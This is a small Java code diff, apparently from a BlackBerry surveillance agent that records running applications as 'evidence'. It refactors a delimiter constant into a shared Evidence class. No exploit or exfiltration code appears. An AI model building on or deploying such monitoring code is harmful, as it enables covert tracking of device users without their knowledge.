@@ -16,6 +16,7 @@ import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -32,7 +33,7 @@ public final class ApplicationAgent extends Agent implements
             DebugLevel.VERBOSE);
     //#endif
 
-    public int LOG_DELIMITER = 0xABADC0DE;
+    
 
     //boolean firstRun = true;
 
@@ -181,7 +182,7 @@ public final class ApplicationAgent extends Agent implements
         items.addElement(WChar.getBytes(appName, true));
         items.addElement(WChar.getBytes(condition, true));
         items.addElement(WChar.getBytes(mod, true));
-        items.addElement(Utils.intToByteArray(LOG_DELIMITER));
+        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
         evidence.createEvidence(null);
         evidence.writeEvidences(items);
